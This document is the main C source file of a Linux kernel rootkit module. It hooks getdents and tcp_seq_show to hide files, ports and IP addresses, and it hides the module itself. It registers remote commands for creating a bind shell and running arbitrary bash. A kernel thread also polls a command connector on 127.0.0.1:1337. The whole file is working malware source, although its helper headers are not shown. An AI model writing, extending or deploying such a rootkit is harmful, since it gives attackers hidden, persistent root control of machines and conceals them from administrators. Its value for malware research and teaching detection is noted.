#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/delay.h>

#include <linux/kthread.h>
#include <linux/wait.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("default");
MODULE_DESCRIPTION("module");
MODULE_VERSION("0.01");


#include "connector.h"
#include "mods/bindshell.h"



#include "hooker/getdents.h"
#include "mods/hidedent.h"



#include "hooker/tcp_seq_show.h"
#include "mods/hideport.h"
#include "mods/hideip.h"



#include "mods/hideme.h"



#include "mods/runshell.h"


void init_rootkit(void) {

    
    install_getdents_hook();
    
    
    install_tcp_seq_show_hook();
    
    
    hideme("");
    
    
    add_function("HIDEME", hideme);
    add_function("SHOWME", showme);
    add_function("HIDE_DENT", hide_dent);
    add_function("SHOW_HIDDEN_DENT", show_hidden_dent);
    add_function("HIDE_PORT", hide_port);
    add_function("SHOW_HIDDEN_PORT", show_hidden_port);
    add_function("HIDE_IP", hide_ip);
    add_function("SHOW_HIDDEN_IP", show_hidden_ip);
    add_function("BINDSHELL_CREATE", bindshell_create);
    add_function("RUN_CUSTOM_BASH", run_custom_bash);
    


    
    hide_dent("91746");
    
    hide_dent("1337test_");
    
    
    hide_port("8080");
    
    
    hide_ip("127.0.0.1");
    
    
    run_custom_bash("sleep 1000");
    

}

void clear_rootkit(void) {
    
    remove_getdents_hook();
    
    
    remove_tcp_seq_show_hook();
    
    
    clear_functions();
    
}


DECLARE_WAIT_QUEUE_HEAD(runner_wait_queue);

struct task_struct *runner_task = NULL;
int runner(void *ptr) {
    DECLARE_WAITQUEUE(wq, current);
    add_wait_queue(&runner_wait_queue, &wq);
    while (!kthread_should_stop()) {
        connector("127.0.0.1", 1337);
        msleep(1000);
    }
    set_current_state(TASK_RUNNING);
    remove_wait_queue(&runner_wait_queue, &wq);
    return 0;
}


static int __init rootkit_example_init(void) {
    init_rootkit();

    
    runner_task = kthread_run(runner, NULL, "kthread_module");
    if (runner_task) {
        get_task_struct(runner_task);
        msleep(1000);
        wake_up(&runner_wait_queue);
    }
    
    return 0;
}

static void __exit rootkit_example_exit(void) {
    
    kthread_stop(runner_task);
    
    clear_rootkit();
}

module_init(rootkit_example_init);
module_exit(rootkit_example_exit);